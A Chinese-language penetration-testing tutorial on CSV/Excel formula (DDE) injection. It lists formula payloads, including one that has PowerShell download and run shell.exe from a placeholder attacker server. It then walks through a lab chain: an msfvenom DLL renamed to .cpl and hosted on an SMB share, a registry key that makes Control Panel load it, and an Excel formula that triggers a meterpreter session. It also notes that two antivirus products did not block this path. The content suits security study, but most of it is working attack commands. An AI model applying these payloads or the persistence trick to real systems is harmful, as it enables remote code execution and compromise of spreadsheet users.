## CSV注入 ##

### 说明 ###
CSV又称xls注入或excel注入，通过在excel表里面进行操作调用其他进程


### 例子 ###
```
@SUM(1+1)*cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```
cmd为你要执行的查询可以换成别的，比如说将第一个变成
```
@SUM(1+1)*notepad|' demo.txt'!A0
```
![](https://s2.ax1x.com/2019/06/06/VdEzDO.png)

当打开xls之后点击信任源就会执行
![](https://s2.ax1x.com/2019/06/06/VdVP5d.png)

### xls反弹meterpreter ###
环境：
```
windows server 2008 --- 192.168.241.129 开启了网络共享
kali --- 192.168.241.136
windows 7 --- 192.168.241.134 安有360服务
```

先做一个简单的测试：
kali生成一个简单的弹calc的dll,并将dll后缀名改为cpl
```
msfvenom -p windows/exec CMD=calc.exe -f dll > hook.dll
mv hook.dll hook.cpl
```
![](https://s2.ax1x.com/2019/06/06/VddgIJ.md.png)

将这个hook.cpl移到windows server 2008的网络共享里
![](https://s2.ax1x.com/2019/06/06/VddIsK.png)

在windows7执行 （发现360并不拦截这个路径，火绒也试过）
```
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /t REG_SZ /d "\\192.168.241.129\Public\hook.cpl"
```
![](https://s2.ax1x.com/2019/06/06/Vdw5fs.md.png)

此时打开控制面板会弹出calc
![](https://s2.ax1x.com/2019/06/06/VdwTlq.md.png)

使用Procmon跟踪进程发现控制面板会寻找这个注册表路径并加载里面的cpl
![](https://s2.ax1x.com/2019/06/06/VdwqmT.png)

![](https://s2.ax1x.com/2019/06/06/Vd0Zhd.md.png)

![](https://s2.ax1x.com/2019/06/06/Vd0n1I.png)

远程加载之后我回去windows server 2008发现个事情
dll变成了这样，而且一删除就会重新出现= =。。后面问了Yansu才知道怎么回事
(PS：如果要删除，先删除目标加里的注册表路径，然后在共享的那台机里重启，重新进入系统后在访问共享删除)
![](https://s2.ax1x.com/2019/06/06/VdB5Mq.png)

实验结束，回到上一层话题，使用xls执行cmd命令添加这个注册表路径并执行控制面板获取meterpreter
流程大概是这样的：
![](https://s2.ax1x.com/2019/06/06/Vd0y4J.png)

生成dll改名为cpl
![](https://s2.ax1x.com/2019/06/06/Vd0jDf.md.png)


重新放入hook.cpl
![](https://s2.ax1x.com/2019/06/06/VdDDfJ.md.png)

msf开启监听
![](https://s2.ax1x.com/2019/06/06/VdD4te.png)

在xls插入以下语句
```
=cmd|' /C reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /t REG_SZ /d "\\192.168.241.129\Public\hook.cpl"'!_xlbgnm.A1
```
![](https://s2.ax1x.com/2019/06/06/Vdr4bV.md.png)

打开控制面板触发
![](https://s2.ax1x.com/2019/06/06/VdytOI.png)

gif动图
![Vd6ucj.gif](https://s2.ax1x.com/2019/06/06/Vd6ucj.gif)

参考文章：
http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
